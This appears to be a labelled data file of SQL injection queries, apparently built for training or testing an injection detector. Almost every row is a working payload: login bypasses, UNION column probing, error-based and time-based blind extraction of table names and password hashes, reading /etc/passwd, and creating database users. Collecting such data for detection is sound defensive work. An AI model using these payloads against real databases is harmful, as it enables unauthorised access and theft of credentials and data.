query;label
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)));1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)));1
AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)));1
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC);1
AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a);1
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX';1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#;1
'-';1
' ';1
'&';1
'^';1
'*';1
' or ''-';1
' or '' ';1
' or ''&';1
' or ''^';1
' or ''*';1
"""-""";1
""" """;1
"""&""";1
"""^""";1
"""*""";1
""" or """"-""";1
""" or """" """;1
""" or """"&""";1
""" or """"^""";1
""" or """"*""";1
or true--;1
""" or true--";1
' or true--;1
""") or true--";1
') or true--;1
' or 'x'='x;1
') or ('x')=('x;1
')) or (('x'))=(('x;1
""" or ""x""=""x";1
""") or (""x"")=(""x";1
""")) or ((""x""))=((""x";1
or 1=1;1
or 1=1--;1
or 1=1#;1
or 1=1/*;1
admin' --;1
admin' #;1
admin'/*;1
admin' or '1'='1;1
admin' or '1'='1'--;1
admin' or '1'='1'#;1
admin' or '1'='1'/*;1
admin'or 1=1 or ''=';1
admin' or 1=1;1
admin' or 1=1--;1
admin' or 1=1#;1
admin' or 1=1/*;1
admin') or ('1'='1;1
admin') or ('1'='1'--;1
admin') or ('1'='1'#;1
admin') or ('1'='1'/*;1
admin') or '1'='1;1
admin') or '1'='1'--;1
admin') or '1'='1'#;1
admin') or '1'='1'/*;1
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055;1
"admin"" --";1
"admin"" #";1
"admin""/*";1
"admin"" or ""1""=""1";1
"admin"" or ""1""=""1""--";1
"admin"" or ""1""=""1""#";1
"admin"" or ""1""=""1""/*";1
"admin""or 1=1 or """"=""";1
"admin"" or 1=1";1
"admin"" or 1=1--";1
"admin"" or 1=1#";1
"admin"" or 1=1/*";1
"admin"") or (""1""=""1";1
"admin"") or (""1""=""1""--";1
"admin"") or (""1""=""1""#";1
"admin"") or (""1""=""1""/*";1
"admin"") or ""1""=""1";1
"admin"") or ""1""=""1""--";1
"admin"") or ""1""=""1""#";1
"admin"") or ""1""=""1""/*";1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055";1
""" or pg_sleep  (  __TIME__  )  --";1
"create user name identified by pass123 temporary tablespace temp default tablespace users;";1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i;1
 select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1';1
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1";1
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --;1
select * from users where id  =  1 +$+ or 1  =  1 -- 1;1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;";1
 select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1';1
 select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1';1
? or 1  =  1 --;1
 )   or   (  'a'  =  'a;1
admin' or 1  =  1#;1
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1";1
or 1  =  1 --;1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i;1
 select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1';1
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1";1
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1";1
distinct;1
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1';1
1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116;1
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1;1
"admin"" or ""1""  =  ""1""--";1
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1";1
insert;1
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1";1
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1";1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i;1
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1";1
"or 1  =  1 or """"  =  ";1
/**/or/**/1/**/  =  /**/1;1
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1";1
 select * from users where id  =  '1' union select ||/1,version  (    )   -- 1';1
 select * from users where id  =  '1' union select +\.,@@VERSION -- 1';1
or 1  =  1/*;1
%27 or 1  =  1;1
 select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1;1
 select * from users where id  =  '1' union select $*$,@@VERSION -- 1';1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...";1
 select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1';1
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1;1
 select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1';1
 select * from users where id  =  1 union select 1||1,version  (    )   -- 1;1
 select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1;1
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1';1
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1";1
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1";1
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1";1
or 1 --';1
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1";1
"admin"" or 1  =  1#";1
 select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1;1
\x27UNION SELECT;1
PRINT;1
 select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1';1
or 1  =  1--;1
1 or pg_sleep  (  __TIME__  )  --;1
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1";1
admin'  )   or   (  '1'  =  '1'/*;1
or 2 between 1 and 3;1
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1";1
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1";1
admin' or '1'  =  '1;1
"; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --";1
 select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1;1
""" or 0  =  0 --";1
 select * from users where id  =  1 union select @ $_,version  (    )   -- 1;1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1;1
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1";1
 select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1;1
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1";1
char%4039%41%2b%40SELECT;1
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1";1
admin'  )   or   (  '1'  =  '1;1
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...;1
"or 0  =  0 #""";1
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1";1
  )   or   (  'x'  =  'x;1
 select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1;1
$  (  sleep 50  ) ;1
 select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1;1
1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --;1
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1";1
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1";1
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1";1
"""a"""" or 1  =  1--""";1
 select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1;1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i;1
 select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1';1
1 and user_name  (    )     =   'dbo';1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --";1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1";1
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1";1
select * from users where id  =  '1' *$ . or 1  =  1 -- 1';1
select * from users where id  =  1 +$+. or 1  =  1 -- 1;1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1;1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i;1
or 1  =  1 or ''  =  ';1
select * from users where id  =  1   or 1  =  1 -- 1;1
or 'text' > 't';1
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055";1
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1";1
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1";1
admin' or '1'  =  '1'#;1
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1;1
s;1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i;1
 select * from information_schema.tables--;1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1";1
1   )    )    or pg_sleep  (  __TIME__  )  --;1
 select * from users where id  =  '1' union select !<@,version  (    )   -- 1';1
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...;1
 or 1  =  1 or ''  =  ';1
select * from users where id  =  1 %!<1 or 1  =  1 -- 1;1
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ;1
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1";1
 select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1;1
or 'unusual'   =   'unusual';1
 or 1 in   (  select @@version  )  --;1
truncate;1
as;1
 or 3  =  3 --;1
 select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1;1
 select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1;1
"admin""  )   or   (  ""1""  =  ""1";1
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1";1
1  )   or benchmark  (  10000000,MD5  (  1   )    )   #;1
 select * from users where id  =  1 union select .1_,version  (    )   -- 1;1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i;1
" or 0  =  0 #""";1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1;1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1;1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --";1
1  )   or sleep  (  __TIME__  )  #;1
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1";1
 select * from users where id  =  1 <1## union select 1,version  (    )   -- 1;1
 select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1;1
select * from users where id  =  1. <@ or 1  =  1 -- 1;1
 or true--;1
"; execute immediate 'sel' || 'ect us' || 'er'";1
"hi' or 'x'  =  'x';";1
select * from users where id  =  1 <@ or 1  =  1 -- 1;1
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1";1
admin' #;1
 select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1;1
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1";1
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1";1
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;";1
"""  )  ;waitfor delay '0:0:__TIME__'--";1
 or 'unusual'   =   'unusual';1
insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ;1
"admin"" or ""1""  =  ""1""/*";1
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1";1
 select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1;1
like;1
"or username like char  (  37  )  ;";1
 )    )    or pg_sleep  (  __TIME__  )  --;1
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1;1
or 3  =  3;1
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1";1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1;1
exec sp;1
 select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1;1
select * from users where id  =  1 or \<$ or 1  =  1 -- 1;1
 select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1;1
admin' or 1  =  1/*;1
a' waitfor delay '0:0:10'--;1
 select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1;1
 select * from users where id  =  1 union select .1$_,version  (    )   -- 1;1
and 1 in   (  select var from temp  )  --;1
hi'  )   or   (  'a'  =  'a;1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i;1
"admin"" or 1  =  1";1
"""  )   or true--";1
 select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1';1
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1";1
1  )   or pg_sleep  (  __TIME__  )  --;1
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1";1
"""  )   or sleep  (  __TIME__  )    =  """;1
select * from users where id  =  1.<@. or 1  =  1 -- 1;1
"admin""  )   or   (  ""1""  =  ""1""--";1
 select * from users where id  =  1<@.. union select 1,version  (    )   -- 1;1
